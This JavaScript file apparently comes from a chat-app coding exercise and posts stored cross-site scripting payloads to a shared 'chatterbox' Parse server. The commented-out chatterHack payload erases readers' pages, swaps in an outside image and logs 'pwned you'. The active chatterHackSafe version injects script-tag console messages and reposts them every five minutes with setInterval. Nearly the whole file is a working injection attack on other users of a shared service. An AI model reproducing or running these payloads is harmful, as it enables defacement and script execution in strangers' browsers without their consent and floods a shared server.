//function worker_function() {
  function send(message) {
    $.ajax({
      // This is the url you should use to communicate with the parse API server.
      url: 'https://api.parse.com/1/classes/chatterbox',
      type: 'POST',
      data: JSON.stringify(message),
      contentType: 'application/json',
      success: function (data) {
        console.log('chatterbox: Message sent');
      },
      error: function (data) {
        // See: https://developer.mozilla.org/en-US/docs/Web/API/console.error
        console.error('chatterbox: Failed to send message');
      }
    });
  }

  function chatterHack() {
    var hack = {
      username: 'GreenRaccoon23',
      text: "$('html').html('');$('body').css({'background-image': 'url(https://goo.gl/RG0g2I)', 'background-size': 'cover', 'width': '100%', 'height': '100%', 'display': 'block', 'margin': '0'});console.error('GreenRaccoon23 pwned you')",
      roomname: 'lobby'
    };
    send(hack);
    hack.text = "<script>$('html').html('');$('body').css({'background-image': 'url(https://goo.gl/RG0g2I)', 'background-size': 'cover', 'width': '100%', 'height': '100%', 'display': 'block', 'margin': '0'});console.error('GreenRaccoon23 pwned you')</script>";
    send(hack);
    hack.text = "GreenRaccoon23 <script>$('html').html('');$('body').css({'background-image': 'url(https://goo.gl/RG0g2I)', 'background-size': 'cover', 'width': '100%', 'height': '100%', 'display': 'block', 'margin': '0'});console.error('GreenRaccoon23 pwned you')</script>";
    send(hack);
  }

  function chatterHackSafe() {
    var hack = {
      username: 'GreenRaccoon23',
      text: "console.log('GreenRaccoon23 could have pwned you')",
      roomname: 'lobby'
    };
    send(hack);
    hack.text = "<script>console.log('GreenRaccoon23 could have pwned you')</script>";
    send(hack);
    //hack.text = "GreenRaccoon23 <script>console.log('GreenRaccoon23 could have pwned you')</script>";
    //app.send(hack);
  }
  //chatterHack();
  //setInterval(chatterHack, 300000);
  chatterHackSafe();
  setInterval(chatterHackSafe, 300000);

  /*
  var message = {
    username: 'GreenRaccoon23',
    text: "$('html').html('');$('body').css({'background-image': 'url(https://goo.gl/RG0g2I)', 'background-size': 'cover', 'width': '100%', 'height': '100%', 'display': 'block', 'margin': '0'});console.error('GreenRaccoon23 pwned you')",
    roomname: 'lobby'
  };
  */
//}
